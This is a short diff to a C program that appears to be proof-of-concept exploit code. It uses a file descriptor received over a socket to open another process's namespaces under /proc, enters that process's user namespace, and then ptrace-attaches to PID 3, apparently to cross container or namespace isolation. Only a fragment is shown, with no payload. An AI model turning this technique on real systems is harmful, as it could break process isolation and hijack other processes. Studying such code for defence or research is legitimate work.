@@ -59,13 +59,12 @@ int main(int argc, char * argv[])
 	int remote_fd = recv_fd(cl);
     my_log("recved fd", remote_fd);
 
-    my_log("open_ns", 0);
-    int user_ns = openat(remote_fd, "proc/12/ns/user", 0);
+    int user_ns = openat(remote_fd, "proc/9/ns/user", 0);
     if (user_ns < 0)
     {
         my_err("open user_ns");
     }
-    int pid_ns = openat(remote_fd, "proc/12/ns/pid", 0);
+    int pid_ns = openat(remote_fd, "proc/9/ns/pid", 0);
     if (pid_ns < 0)
     {
         my_err("open pid_ns");
@@ -76,12 +75,21 @@ int main(int argc, char * argv[])
     {
         my_err("setns user");
     }
-    my_log("set pidns", 0);
-    ret = setns(pid_ns, CLONE_NEWPID);
-    if (ret < 0)
-    {
-        my_err("setns pid");
-    }
+    /* my_log("set pidns", 0); */
+    /* ret = setns(pid_ns, CLONE_NEWPID); */
+    /* if (ret < 0) */
+    /* { */
+    /*     my_err("setns pid"); */
+    /* } */
     report("sniper");
+
+	sleep(5);
+	ret = ptrace(PTRACE_ATTACH, 3, NULL, NULL);
+	if (ret < 0)
+	{
+        my_err("ptrace attach");
+    }
+    my_log("attached", 0);
+
     sleep(3000);
 }
